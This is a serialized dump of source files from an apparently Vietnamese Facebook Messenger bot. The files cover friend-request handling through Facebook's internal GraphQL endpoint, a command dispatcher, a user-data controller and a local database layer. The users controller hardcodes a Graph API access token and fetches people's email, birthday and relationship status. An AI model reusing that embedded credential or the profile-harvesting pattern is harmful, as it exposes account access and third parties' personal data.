0\n};\n\n\nmodule.exports.handleReply = async ({ handleReply, event, api }) => {\n  const { author, listRequest } = handleReply;\n  if (author != event.senderID) return;\n  const args = event.body.replace(/ +/g, \" \").toLowerCase().split(\" \");\n  \n  const form = {\n    av: api.getCurrentUserID(),\n\t\tfb_api_caller_class: \"RelayModern\",\n\t\tvariables: {\n      input: {\n        source: \"friends_tab\",\n        actor_id: api.getCurrentUserID(),\n        client_mutation_id: Math.round(Math.random() * 19).toString()\n      },\n      scale: 3,\n      refresh_num: 0\n\t\t}\n  };\n  \n  const success = [];\n  const failed = [];\n  \n  if (args[0] == \"add\") {\n    form.fb_api_req_friendly_name = \"FriendingCometFriendRequestConfirmMutation\";\n    form.doc_id = \"3147613905362928\";\n  }\n  else if (args[0] == \"del\") {\n    form.fb_api_req_friendly_name = \"FriendingCometFriendRequestDeleteMutation\";\n    form.doc_id = \"4108254489275063\";\n  }\n  else return api.sendMessage(\"Vui l√≤ng ch·ªçn <add | del > <s·ªë th·ª© t·ª± | ho·∫∑c \\\"all\\\">\", event.threadID, event.messageID);\n  let targetIDs = args.slice(1);\n  \n  if (args[1] == \"all\") {\n    targetIDs = [];\n    const lengthList = listRequest.length;\n    for (let i = 1; i <= lengthList; i++) targetIDs.push(i);\n  }\n  \n  const newTargetIDs = [];\n  const promiseFriends = [];\n  \n  for (const stt of targetIDs) {\n    const u = listRequest[parseInt(stt) - 1];\n    if (!u) {\n      failed.push(`Kh√¥ng t√¨m th·∫•y stt ${stt} trong danh s√°ch`);\n      continue;\n    }\n    form.variables.input.friend_requester_id = u.node.id;\n    form.variables = JSON.stringify(form.variables);\n    newTargetIDs.push(u);\n    promiseFriends.push(api.httpPost(\"https://www.facebook.com/api/graphql/\", form));\n\t\tform.variables = JSON.parse(form.variables);\n  }\n  \n  const lengthTarget = newTargetIDs.length;\n  for (let i = 0; i < lengthTarget; i++) {\n    try {\n      const friendRequest = await promiseFriends[i];\n      if (JSON.parse(friendRequest).errors) failed.push(newTargetIDs[i].node.name);\n      else success.push(newTargetIDs[i].node.name);\n    }\n    catch(e) {\n      failed.push(newTargetIDs[i].node.name);\n    }\n  }\n  \n  \n  api.sendMessage(`¬ª ƒê√£ ${args[0] == 'add' ? 'ch·∫•p nh·∫≠n' : 'x√≥a'} l·ªùi m·ªùi k·∫øt b·∫°n th√†nh c√¥ng c·ªßa ${success.length} ng∆∞·ªùi:\\n${success.join(\"\\n\")}${failed.length > 0 ? `\\n¬ª Th·∫•t b·∫°i v·ªõi ${failed.length} ng∆∞·ªùi: ${failed.join(\"\\n\")}` : \"\"}`, event.threadID, event.messageID);\n};\n\n\nmodule.exports.run = async ({ event, api }) => {\n  const moment = require(\"moment-timezone\");\n  const form = {\n    av: api.getCurrentUserID(),\n  \tfb_api_req_friendly_name: \"FriendingCometFriendRequestsRootQueryRelayPreloader\",\n  \tfb_api_caller_class: \"RelayModern\",\n  \tdoc_id: \"4499164963466303\",\n  \tvariables: JSON.stringify({input: {scale: 3}})\n  };\n  const listRequest = JSON.parse(await api.httpPost(\"https://www.facebook.com/api/graphql/\", form)).data.viewer.friending_possibilities.edges;\n  let msg = \"\";\n  let i = 0;\n  for (const user of listRequest) {\n    i++;\n    msg += (`\\n${i}. Name: ${user.node.name}`\n         + `\\nID: ${user.node.id}`\n         + `\\nUrl: ${user.node.url.replace(\"www.facebook\", \"fb\")}`\n         + `\\nTime: ${moment(user.time*1000).tz(\"Asia/Ho_Chi_Minh\").format(\"DD/MM/YYYY HH:mm:ss\")}\\n`);\n  }\n  api.sendMessage(`${msg}\\nReply tin nh·∫Øn n√†y v·ªõi n·ªôi dung: <add | del> <s·ªë th·ª© t·ª± | ho·∫∑c \\\"all\\\"> ƒë·ªÉ th·ª±c hi·ªán h√†nh ƒë·ªông`, event.threadID, (e, info) => {\n      global.client.handleReply.push({\n        name: this. config. name,\n        messageID: info.messageID,\n        listRequest,\n        author: event.senderID\n      });\n    }, event.messageID);\n};","path":null,"size_bytes":3850,"size_tokens":null},"lib/fca-auto/src/createNewGroup.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function createNewGroup(participantIDs, groupTitle, callback) {\n    if (utils.getType(groupTitle) == \"Function\") {\n      callback = groupTitle;\n      groupTitle = null;\n    }\n\n    if (utils.getType(participantIDs) !== \"Array\") throw { error: \"createNewGroup: participantIDs should be an array.\" };\n\n    if (participantIDs.length < 2) throw { error: \"createNewGroup: participantIDs should have at least 2 IDs.\" };\n\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (err, threadID) {\n        if (err) return rejectFunc(err);\n        resolveFunc(threadID);\n      };\n    }\n\n    var pids = [];\n    for (var n in participantIDs) pids.push({ fbid: participantIDs[n] });\n    pids.push({ fbid: ctx.userID });\n\n    var form = {\n      fb_api_caller_class: \"RelayModern\",\n      fb_api_req_friendly_name: \"MessengerGroupCreateMutation\",\n      av: ctx.userID,\n      //This doc_id is valid as of January 11th, 2020\n      doc_id: \"577041672419534\",\n      variables: JSON.stringify({\n        input: {\n          entry_point: \"jewel_new_group\",\n          actor_id: ctx.userID,\n          participants: pids,\n          client_mutation_id: Math.round(Math.random() * 1024).toString(),\n          thread_settings: {\n            name: groupTitle,\n            joinable_mode: \"PRIVATE\",\n            thread_image_fbid: null\n          }\n        }\n      })\n    };\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/api/graphql/\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        if (resData.errors) throw resData;\n        return callback(null, resData.data.messenger_group_thread_create.thread.thread_key.thread_fbid);\n      })\n      .catch(function (err) {\n        log.error(\"createNewGroup\", err);\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":2158,"size_tokens":null},"includes/handle/handleCommand.js":{"content":"module.exports = function ({ api, models, Users, Threads, Currencies }) {\n  const fs = require(\"fs\");\n  const stringSimilarity = require('string-similarity'),escapeRegex = (str) => str.replace(/[.*+?^${}()|[\\]\\\\]/g, \"\\\\$&\"),logger = require(\"../../utils/log.js\");\n  const axios = require('axios');\n  const request = require('request');\n  const path = require('path')\n  const moment = require(\"moment-timezone\");\n  return async function ({ event }) {\n    const dateNow = Date.now()  //ping\n    const time = moment.tz(\"Asia/Ho_Chi_minh\").format(\"HH:MM:ss DD/MM/YYYY\"); // gi·ªù\n    const times = process.uptime(),hours = Math.floor(times / (60 * 60)),minutes = Math.floor((times % (60 * 60)) / 60),seconds = Math.floor(times % 60);  //upt\n         const { allowInbox, PREFIX, ADMINBOT, NDH, DeveloperMode, adminOnly, keyAdminOnly, ndhOnly,adminPaseOnly } = global.config;\n         const { userBanned, threadBanned, threadInfo, threadData, commandBanned } = global.data;\n         const { commands, cooldowns } = global.client;\n         var { body, senderID, threadID, messageID } = event;\n         var senderID = String(senderID),threadID = String(threadID);\n         const threadSetting = threadData.get(threadID) || {}\n         const prefixRegex = new RegExp(`^(<@!?${senderID}>|${escapeRegex((threadSetting.hasOwnProperty(\"PREFIX\")) ? threadSetting.PREFIX : PREFIX)})\\\\s*`);\n         if (!prefixRegex.test(body)) return;\n         const adminbot = require('./../../config.json');\n         let getDay = moment.tz(\"Asia/Ho_Chi_Minh\").day();\n         let usgPath = __dirname + '/usages.json';\n         if (!fs.existsSync(usgPath)) fs.writeFileSync(usgPath, JSON.stringify({}));\n         let usages = JSON.parse(fs.readFileSync(usgPath));\n         \n   if(!global.data.allThreadID.includes(threadID) && !ADMINBOT.includes(senderID) && adminbot.adminPaseOnly == true) {\n return api.sendMessage(\"Admin bot m·ªõi d√πng bot trong ƒëo·∫°n chat ri√™ng!!\", threadID, messageID)\n}    \n   if (!ADMINBOT.includes(senderID) && adminbot.adminOnly == true) {\n     if (!ADMINBOT.includes(senderID) && adminbot.adminOnly == true) return api.sendMessage('Admin bot m·ªõi s·ª≠ d·ª•ng ƒë∆∞·ª£c!!', threadID, messageID)\n   }\n    if (!NDH.includes(senderID) && !ADMINBOT.includes(senderID) && adminbot.ndhOnly == true) { \n         return api.sendMessage('NDH m·ªõi c√≥ th·ªÉ s·ª≠ d·ª•ng bot', threadID, messageID)\n\n       }\nconst dataAdbox = require('./../../modules/commands/cache/data.json');\n   var threadInf = (threadInfo.get(threadID) || await Threads.getInfo(threadID));\n   const findd = threadInf.adminIDs.find(el => el.id == senderID);\n  if (dataAdbox.adminbox.hasOwnProperty(threadID) && dataAdbox.adminbox[threadID] == true && !ADMINBOT.includes(senderID) && !findd && event.isGroup == true && !NDH.includes(senderID) && !findd && event.isGroup == true) return api.sendMessage('Qu·∫£n tr·ªã vi√™n m·ªõi s·ª≠ d·ª•ng ƒë∆∞·ª£c!!', event.threadID, event.messageID)\n   if (userBanned.has(senderID) || threadBanned.has(threadID) || allowInbox == ![] && senderID == threadID) {\n     if (!ADMINBOT.includes(senderID.toString()) && !NDH.includes(senderID.toString())) {\n       if (userBanned.has(senderID)) {\n         const { reason, dateAdded } = userBanned.get(senderID) || {};\n         return api.sendMessage(global.getText(\"handleCommand\", \"userBanned\", reason, dateAdded), threadID, async (err, info) => {\n           await new Promise(resolve => setTimeout(resolve, 5 * 1000));\n           return api.unsendMessage(info.messageID);\n         }, messageID);\n       } else {\n         if (threadBanned.has(threadID)) {\n           const { reason, dateAdded } = threadBanned.get(threadID) || {};\n           return api.sendMessage(global.getText(\"handleCommand\", \"threadBanned\", reason, dateAdded), threadID, async (err, info) => {\n             await new Promise(resolve => setTimeout(resolve, 5 * 1000));\n             return api.unsendMessage(info.messageID);\n           }, messageID);\n         }\n       }\n     }\n   }\n   const [matchedPrefix] = body.match(prefixRegex),\n     args = body.slice(matchedPrefix.length).trim().split(/ +/);\n   commandName = args.shift().toLowerCase();\n   var command = commands.get(commandName);\n   fs.writeFileSync(usgPath, JSON.stringify(usages, null, 4));\n\n   \n   if (!command) {\n     var allCommandName = [];\n     const commandValues = commands['keys']();\n\n     const tdung = require('./../../img/gaivip.json');\n     var image1 = tdung[Math.floor(Math.random() * tdung.length)].trim();\n     var image2 = tdung[Math.floor(Math.random() * tdung.length)].trim();\n     function vtuanhihi(image,vtuandz,callback){\n       request(image).pipe(fs.createWriteStream(__dirname + `/`+vtuandz)).on(\"close\", callback);\n     }\n     \n     \n     \n     for (const cmd of commandValues) allCommandName.push(cmd)\n     const checker = stringSimilarity.findBestMatch(commandName, allCommandName);\n     if (checker.bestMatch.rating >= 0.5) command = client.commands.get(checker.bestMatch.target);\n     else { \n\n    let callback = function () {\n      api.sendMessage({\n        body: `${global.getText(\"handleCommand\", \"commandNotExist\", checker.bestMatch.target)}`,\n       //attachment: [fs.createReadStream(__dirname + `/1.png`), fs.createReadStream(__dirname + `/2.png`)]\n         }, event.threadID, () => {\n           fs.unlinkSync(__dirname + `/1.png`);\n           fs.unlinkSync(__dirname + `/2.png`);\n         }, event.messageID);\n       };\n           vtuanhihi(image1,'1.png',()=>{vtuanhihi(image2,'2.png',callback)})\n  }\n}\n\n    \n\n   \n   if (commandBanned.get(threadID) || commandBanned.get(senderID)) {\n     if (!ADMINBOT.includes(senderID)) {\n       const banThreads = commandBanned.get(threadID) || [],\n         banUsers = commandBanned.get(senderID) || [];\n       if (banThreads.includes(command.config.name))\n         return api.sendMessage(global.getText(\"handleCommand\", \"commandThreadBanned\", command.config.name), threadID, async (err, info) => {\n           await new Promise(resolve => setTimeout(resolve, 5 * 1000))\n           return api.unsendMessage(info.messageID);\n         }, messageID);\n       if (banUsers.includes(command.config.name))\n         return api.sendMessage(global.getText(\"handleCommand\", \"commandUserBanned\", command.config.name), threadID, async (err, info) => {\n           await new Promise(resolve => setTimeout(resolve, 5 * 1000));\n           return api.unsendMessage(info.messageID);\n         }, messageID);\n     }\n   }\n   if (command.config.commandCategory.toLowerCase() == 'nsfw' && !global.data.threadAllowNSFW.includes(threadID) && !ADMINBOT.includes(senderID))\n     return api.sendMessage(global.getText(\"handleCommand\", \"threadNotAllowNSFW\"), threadID, async (err, info) => {\n\n       await new Promise(resolve => setTimeout(resolve, 5 * 1000))\n       return api.unsendMessage(info.messageID);\n     }, messageID);\n   var threadInfo2;\n   if (event.isGroup == !![])\n     try {\n       threadInfo2 = (threadInfo.get(threadID) || await Threads.getInfo(threadID))\n       if (Object.keys(threadInfo2).length == 0) throw new Error();\n     } catch (err) {\n       logger(global.getText(\"handleCommand\", \"cantGetInfoThread\", \"error\"));\n     }\n      var permssion = 0;\n   var threadInfoo = (threadInfo.get(threadID) || await Threads.getInfo(threadID));\n   const find = threadInfoo.adminIDs.find(el => el.id == senderID);\n   if (ADMINBOT.includes(senderID.toString())) permssion = 3;\n   else if (NDH.includes(senderID.toString())) permssion = 2;\n   else if (!ADMINBOT.includes(senderID) && find) permssion = 1;\n   var quyenhan = \"\"\n   if (command.config.hasPermssion == 1 ){\n     quyenhan = \"Qu·∫£n Tr·ªã Vi√™n\"\n   } else if (command.config.hasPermssion == 2 ) {\n     quyenhan = \"SUPPORTBOT\"\n   } else if(command.config.hasPermssion == 3) {\n     quyenhan = \"ADMINBOT\"\n   } \n   if (command.config.hasPermssion > permssion) return api.sendMessage(`Quy·ªÅn h·∫°n c·ªßa l·ªánh ${command.config.name} l√†: ${quyenhan}`, event.threadID, event.messageID);\n      if (!client.cooldowns.has(command.config.name)) client.cooldowns.set(command.config.name, new Map());\n       const timestamps = client.cooldowns.get(command.config.name);;\n       const expirationTime = (command.config.cooldowns || 1) * 1000;\n       if (timestamps.has(senderID) && dateNow < timestamps.get(senderID) + expirationTime) \n     return api.setMessageReaction('üòº', event.messageID, err => (err) ? logger('ƒê√£ c√≥ l·ªói x·∫£y ra khi th·ª±c thi setMessageReaction', 2) : '', !![]);\n   var getText2;\n   if (command.languages && typeof command.languages == 'object' && command.languages.hasOwnProperty(global.config.language))\n     getText2 = (...values) => {\n       var lang = command.languages[global.config.language][values[0]] || '';\n       for (var i = values.length; i > 0x2533 + 0x1105 + -0x3638; i--) {\n         const expReg = RegExp('%' + i, 'g');\n         lang = lang.replace(expReg, values[i]);\n       }\n       return lang;\n     };\n    else getText2 = () => { };\n   try {\n     const Obj = {};\n     Obj.api = api\n     Obj.event = event\n     Obj.args = args\n     Obj.models = models\n     Obj.Users = Users\n     Obj.Threads = Threads\n     Obj.Currencies = Currencies\n     Obj.permssion = permssion\n     Obj.getText = getText2\n     usages = JSON.parse(fs.readFileSync(usgPath));\n     fs.writeFileSync(usgPath, JSON.stringify(usages, null, 4));\n     command.run(Obj);\n     timestamps.set(senderID, dateNow);\n     if (DeveloperMode == !![])\n       logger(global.getText(\"handleCommand\", \"executeCommand\", time, commandName, senderID, threadID, args.join(\" \"), (Date.now()) - dateNow), \"MODE\");\n     return;\n   } catch (e) {\n     return api.sendMessage(global.getText(\"handleCommand\", \"commandError\", commandName, e), threadID);\n   }\n };\n};\n","path":null,"size_bytes":9726,"size_tokens":null},"includes/controllers/users.js":{"content":"module.exports = function ({ models, api }) {\n\tconst Users = models.use('Users');\n\n\tasync function getInfo(id) {\n\t\ttry {\n\t\t\treturn (await api.getUserInfo(id))[id];\n\t\t}\n\t\tcatch(e) {\n\t\t\treturn false\n\t\t}\n\t}\n\n\tasync function getNameUser(id) {\n\t\ttry {\n\t\t\tif (global.data.userName.has(id)) return global.data.userName.get(id);\n\t\t\telse if (global.data.allUserID.includes(id)) {\n\t\t\t\tconst nameUser = (await this.getData(id)).name;\n\t\t\t\tif (nameUser) return nameUser;\n\t\t\t\telse return \"Ng∆∞·ªùi d√πng facebook\";\n\t\t\t} else return \"Ng∆∞·ªùi d√πng facebook\";\n\t\t}\n\t\tcatch { return \"Ng∆∞·ªùi d√πng facebook\" }\n\t}\n\n  async function getUserFull(id) {\n\t\tvar resolveFunc = function () { };\n\t    var rejectFunc = function () { };\n\t    var returnPromise = new Promise(function (resolve, reject) {\n\t      resolveFunc = resolve;\n\t      rejectFunc = reject;\n\t    });\n\t\ttry {\n\t        api.httpGet(`https://graph.facebook.com/${id}?fields=name,email,about,birthday,gender,hometown,link,location,quotes,relationship_status,significant_other,username,subscribers.limite(0),website&access_token=${global.account.accessToken}`, (e, i) => {\n            \tif (e) return rejectFunc(e)\n\t            var t = JSON.parse(i);\n\t            var dataUser = {\n\t                error: 0,\n\t                author: 'D-Jukie',\n\t                data: {\n\t                    name: t.name || null,\n\t                    username: t.username || null,\n\t                    uid: t.id || null,\n\t                    about: t.about || null,\n\t                    follow: t.subscribers.summary.total_count || 0,\n\t                    birthday: t.birthday || null,\n\t                    gender: t.gender,\n\t                    hometown: t.hometown || null,\n\t                    link: t.link || null,\n\t                    location: t.location || null,\n\t                    relationship_status: t.relationship_status || null,\n\t                    love: t.significant_other || null,\n\t                    quotes: t.quotes || null,\n\t                    website: t.website || null,\n\t                    imgavt: `https://graph.facebook.com/${t.id}/picture?height=1500&width=1500&access_token=6628568379%7Cc1e620fa708a1d5696fb991c1bde5662`\n\t                }\n\t            };\n\t            return resolveFunc(dataUser)\n\t        });\n\t        return returnPromise\n\t    }\n\t\tcatch(error) { \n\t\t    return resolveFunc({\n\t\t\t\terror: 1, \n\t\t        author: 'J-JRT',\n\t\t        data: {}\n\t\t    })\n\t\t}\n\t}\n\n\tasync function getAll(...data) {\n\t\tvar where, attributes;\n\t\tfor (const i of data) {\n\t\t\tif (typeof i != 'object') throw global.getText(\"users\", \"needObjectOrArray\");\n\t\t\tif (Array.isArray(i)) attributes = i;\n\t\t\telse where = i;\n\t\t}\n\t\ttry {\n\t\t\treturn (await Users.findAll({ where, attributes })).map(e => e.get({ plain: true }));\n\t\t}\n\t\tcatch (error) {\n\t\t\tconsole.error(error);\n\t\t\tthrow new Error(error);\n\t\t}\n\t}\n\n\tasync function getData(userID) {\n\t\ttry {\n\t\t\tconst data = await Users.findOne({ where: { userID } });\n\t\t\tif (data) return data.get({ plain: true });\n\t\t\telse return false;\n\t\t}\n\t\tcatch(error) {\n\t\t\tconsole.error(error);\n\t\t\tthrow new Error(error);\n\t\t}\n\t}\n\n\tasync function setData(userID, options = {}) {\n\t\tif (typeof options != 'object' && !Array.isArray(options)) throw global.getText(\"users\", \"needObject\");\n\t\ttry {\n\t\t\t(await Users.findOne({ where: { userID } })).update(options);\n\t\t\treturn true;\n\t\t}\n\t\tcatch (error) {\n\t\t\ttry {\n\t\t\t\tawait this.createData(userID, options);\n\t\t\t} catch (error) {\n\t\t\t\tconsole.error(error);\n\t\t\t\tthrow new Error(error);\n\t\t\t}\n\t\t}\n\t}\n\n\tasync function delData(userID) {\n\t\ttry {\n\t\t\t(await Users.findOne({ where: { userID } })).destroy();\n\t\t\treturn true;\n\t\t}\n\t\tcatch (error) {\n\t\t\tconsole.error(error);\n\t\t\tthrow new Error(error);\n\t\t}\n\t}\n\n\tasync function createData(userID, defaults = {}) {\n\t\tif (typeof defaults != 'object' && !Array.isArray(defaults)) throw global.getText(\"users\", \"needObject\");\n\t\ttry {\n\t\t\tawait Users.findOrCreate({ where: { userID }, defaults });\n\t\t\treturn true;\n\t\t}\n\t\tcatch (error) {\n\t\t\tconsole.error(error);\n\t\t\tthrow new Error(error);\n\t\t}\n\t}\n\n\treturn {\n\t\tgetInfo,\n\t\tgetNameUser,\n\t\tgetAll,\n\t\tgetData,\n\t\tsetData,\n\t\tdelData,\n\t\tcreateData,\n\t\tgetUserFull\n\t};\n};\n\n\n\n/*module.exports = function ({ models, api }) {\n\tconst Users = models.use('Users');\n\tasync function getInfo(id) {\n\t\treturn (await api.getUserInfo(id))[id];\n\t}\n\tasync function getNameUser(id) {\n\t\ttry {\n\t\t\tif (global.data.userName.has(id)) return global.data.userName.get(id);\n\t\t\telse if (global.data.allUserID.includes(id)) {\n\t\t\t\tconst nameUser = (await this.getData(id)).name;\n\t\t\t\tif (nameUser) return nameUser;\n\t\t\t\telse return \"Ng∆∞·ªùi d√πng facebook\";\n\t\t\t} else return \"Ng∆∞·ªùi d√πng facebook\";\n\t\t}\n\t\tcatch(error) { return \"Ng∆∞·ªùi d√πng facebook\" }\n\t}\n\tasync function getUserFull(id) {\n\t\tvar resolveFunc = function () { };\n\t    var rejectFunc = function () { };\n\t    var returnPromise = new Promise(function (resolve, reject) {\n\t      resolveFunc = resolve;\n\t      rejectFunc = reject;\n\t    });\n\t\ttry {\n\t        api.httpGet(`https://graph.facebook.com/${id}?fields=name,email,about,birthday,gender,hometown,link,location,quotes,relationship_status,significant_other,username,subscribers.limite(0),website&access_token=${global.account.accessToken}`, (e, i) => {\n            \tif (e) return rejectFunc(e)\n\t            var t = JSON.parse(i);\n\t            var dataUser = {\n\t                error: 0,\n\t                author: 'D-Jukie',\n\t                data: {\n\t                    name: t.name || null,\n\t                    username: t.username || null,\n\t                    uid: t.id || null,\n\t                    about: t.about || null,\n\t                    follow: t.subscribers.summary.total_count || 0,\n\t                    birthday: t.birthday || null,\n\t                    gender: t.gender,\n\t                    hometown: t.hometown || null,\n\t                    link: t.link || null,\n\t                    location: t.location || null,\n\t                    relationship_status: t.relationship_status || null,\n\t                    love: t.significant_other || null,\n\t                    quotes: t.quotes || null,\n\t                    website: t.website || null,\n\t                    imgavt: `https://graph.facebook.com/${t.id}/picture?height=1500&width=1500&access_token=6628568379%7Cc1e620fa708a1d5696fb991c1bde5662`\n\t                }\n\t            };\n\t            return resolveFunc(dataUser)\n\t        });\n\t        return returnPromise\n\t    }\n\t\tcatch(error) { \n\t\t    return resolveFunc({\n\t\t\t\terror: 1, \n\t\t        author: 'D-Jukie',\n\t\t        data: {}\n\t\t    })\n\t\t}\n\t}\n\t\n\tasync function getAll(...data) {\n\t\tvar where, attributes;\n\t\tfor (const i of data) {\n\t\t\tif (typeof i != 'object') throw global.getText(\"users\", \"needObjectOrArray\");\n\t\t\tif (Array.isArray(i)) attributes = i;\n\t\t\telse where = i;\n\t\t}\n\t\ttry {\n\t\t\treturn (await Users.findAll({ where, attributes })).map(e => e.get({ plain: true }));\n\t\t}\n\t\tcatch (error) {\n\t\t\tconsole.error(error);\n\t\t\tthrow new Error(error);\n\t\t}\n\t}\n\n\tasync function getData(userID) {\n\t\ttry {\n\t\t\tconst data = await Users.findOne({ where: { userID } });\n\t\t\tif (data) return data.get({ plain: true });\n\t\t\telse return false;\n\t\t}\n\t\tcatch(error) {\n\t\t\tconsole.error(error);\n\t\t\tthrow new Error(error);\n\t\t}\n\t}\n\n\tasync function setData(userID, options = {}) {\n\t\tif (typeof options != 'object' && !Array.isArray(options)) throw global.getText(\"users\", \"needObject\");\n\t\ttry {\n\t\t\t(await Users.findOne({ where: { userID } })).update(options);\n\t\t\treturn true;\n\t\t}\n\t\tcatch (error) {\n\t\t\ttry {\n\t\t\t\tawait this.createData(userID, options);\n\t\t\t} catch (error) {\n\t\t\t\tconsole.error(error);\n\t\t\t\tthrow new Error(error);\n\t\t\t}\n\t\t}\n\t}\n\n\tasync function delData(userID) {\n\t\ttry {\n\t\t\t(await Users.findOne({ where: { userID } })).destroy();\n\t\t\treturn true;\n\t\t}\n\t\tcatch (error) {\n\t\t\tconsole.error(error);\n\t\t\tthrow new Error(error);\n\t\t}\n\t}\n\n\tasync function createData(userID, defaults = {}) {\n\t\tif (typeof defaults != 'object' && !Array.isArray(defaults)) throw global.getText(\"users\", \"needObject\");\n\t\ttry {\n\t\t\tawait Users.findOrCreate({ where: { userID }, defaults });\n\t\t\treturn true;\n\t\t}\n\t\tcatch (error) {\n\t\t\tconsole.error(error);\n\t\t\tthrow new Error(error);\n\t\t}\n\t}\n\n\treturn {\n\t\tgetInfo,\n\t\tgetNameUser,\n\t\tgetAll,\n\t\tgetData,\n\t\tsetData,\n\t\tdelData,\n\t\tcreateData,\n\t\tgetUserFull\n\t};\n};*/","path":null,"size_bytes":8218,"size_tokens":null},"lib/Fca-Horizon-Remastered/Extra/Database/index.js":{"content":"/* eslint-disable no-self-assign */\n/* eslint-disable linebreak-style */\nconst get = require('lodash/get');\nconst set = require('lodash/set');\nconst BetterDB = require(\"better-sqlite3\");\nconst fs = require('fs-extra');\nconst request = require('request');\nconst deasync = require('deasync');\n\nif (!fs.existsSync(process.cwd() + '/Horizon_Database')) {\n    fs.mkdirSync(process.cwd() + '/Horizon_Database');\n    fs.writeFileSync(process.cwd() + '/Horizon_Database/A_README.md', 'This folder is used by ChernobyL(NANI =)) ) to store data. Do not delete this folder or any of the files in it.', 'utf8');\n}\nvar db = new BetterDB(process.cwd() + \"/Horizon_Database/SyntheticDatabase.sqlite\");\n\nfunction Lset(key, value) {\n    if (!key)\n        throw new TypeError(\n            \"No key specified.\"\n        );\n    return arbitrate(\"set\",{\n        stringify: false,\n        id: key,\n        data: value,\n        ops:  {},\n    });\n}\n\nfunction Lget(key) {\n    if (!key)\n        throw new TypeError(\n            \"No key specified.\"\n        );\n    return arbitrate(\"fetch\", { id: key, ops: {} || {} });\n}\n\nfunction Lhas(key) {\n    if (!key)\n        throw new TypeError(\n            \"No key specified.\"\n        );\n    return arbitrate(\"has\", { id: key, ops: {} });\n}\n\nfunction Lremove(key) {\n    if (!key)\n        throw new TypeError(\n            \"No key specified.\"\n        );\n    return arbitrate(\"delete\", { id: key, ops: {} });\n}\n\nfunction LremoveMultiple(key) {\n    if (!key)\n        throw new TypeError(\n            \"No key specified.\"\n        );\n        try {\n            for (let i of key) {\n                arbitrate(\"delete\", { id: i, ops: {} });\n            }\n            return true;\n        } \n    catch (err) {\n        return false;\n    }\n}\n\nfunction Llist() {\n    return arbitrate(\"all\",{ ops: {} });\n}\n\nfunction Replit_Set(key, value) {\n    try {\n        var done = false;\n        \n        request({\n            url: process.env.REPLIT_DB_URL,\n            method: \"POST\",\n            headers: {\n                'Content-Type': 'application/x-www-form-urlencoded',\n            },  \n            body: `${encodeURIComponent(key)}=${encodeURIComponent(JSON.stringify(value))}`\n        \n        }, function (error, response, body) {\n            done = true;\n        });\n\n        deasync.loopWhile(function(){\n            return !done;\n        });\n\n        return;\n        \n    }\n    catch (e) {\n        console.log(e);\n        return false;\n    }\n}\n\nfunction Replit_Get(key) {\n    try {\n        var done = false;\n        var response = null;\n    \n        request(process.env.REPLIT_DB_URL + \"/\" + key, function (error, res, body) {\n            if (!error && res.statusCode == 200) {\n                response = body;\n            }\n            done = true;\n        });\n    \n        deasync.loopWhile(function(){\n            return !done;\n        });\n    \n        return JSON.parse(response);\n    }\n    catch (e) {\n        console.log(e);\n        return false;\n    }\n}\n\nfunction Replit_Has(key) {\n    try {\n        var done = false;\n        var response = null;\n\n        request(process.env.REPLIT_DB_URL + \"/\" + key, function (error, res, body) {\n            if (!error && res.statusCode == 200) {\n                response = body;\n            }\n            done = true;\n        });\n\n        deasync.loopWhile(function(){\n            return !done;\n        });\n\n        return response != null;\n    }\n    catch (e) {\n        console.log(e);\n        return false;\n    }\n}\n\nfunction Replit_Remove(key) {\n    try {\n        var done = false;\n        request.delete(process.env.REPLIT_DB_URL + \"/\" + key , function (error, response, body) {\n            done = true;\n        });\n\n        deasync.loopWhile(function(){\n            return !done;\n        });\n\n        return;\n    }\n    catch (e) {\n        console.log(e);\n        return false;\n    }\n}\nfunction Replit_RemoveMultiple(keys) {\n    try {\n        for (const key of keys) {\n            request.delete(process.env.REPLIT_DB_URL + \"/\" + key , function (error, response, body) {});\n        }\n        return true;\n    }\n    catch (e) {\n        console.log(e);\n        return false;\n    }\n}\n\nfunction Replit_List() {\n    var done = false;\n    var response = null;\n\n    request(process.env.REPLIT_DB_URL + \"?encode=true\" + `&prefix=${encodeURIComponent(\"\")}`, function (error, res, body) {\n        if (!error && res.statusCode == 200) {\n            response = body;\n        }\n        done = true;\n\n    });\n\n    deasync.loopWhile(function(){\n        return !done;\n    });\n\n    if (response.length === 0) {\n        return [];\n    }\n    return response.split(\"\\n\").map(decodeURIComponent);\n}\n\n\nvar methods = {\n    fetch: function(db, params, options) {\n        let fetched = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id);\n        if (!fetched) return null;\n        try { \n            fetched = JSON.parse(fetched.json);\n        } catch (e) {\n            fetched = fetched.json;\n        }\n        return fetched;\n    },\n    set: function(db, params, options) {\n        let fetched = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id);\n        if (!fetched) {\n            db.prepare(`INSERT INTO ${options.table} (ID,json) VALUES (?,?)`).run(params.id, '{}');\n            fetched = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id);\n        }\n        try { \n            fetched = JSON.parse(fetched); \n        } catch (e) {\n            fetched = fetched;\n        }\n        if (typeof fetched === 'object' && params.ops.target) {\n            params.data = JSON.parse(params.data);\n            params.data = set(fetched, params.ops.target, params.data);\n        } \n        else if (params.ops.target) throw new TypeError('Cannot target a non-object.');\n        db.prepare(`UPDATE ${options.table} SET json = (?) WHERE ID = (?)`).run(JSON.stringify(params.data), params.id);\n        let newData = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id).json;\n        if (newData === '{}') return null;\n        else {\n            try { newData = JSON.parse(newData); \n            } \n            catch (e) {\n                newData = newData;\n            }\n            return newData;\n        }\n    },\n    add: function addDB(db, params, options) {\n        let fetched = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id);\n        if (!fetched) {\n            db.prepare(`INSERT INTO ${options.table} (ID,json) VALUES (?,?)`).run(params.id, '{}');\n            fetched = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id); \n        }\n        if (params.ops.target) {\n            try { \n                fetched = JSON.parse(fetched); \n            }\n            catch (e) {\n                fetched = 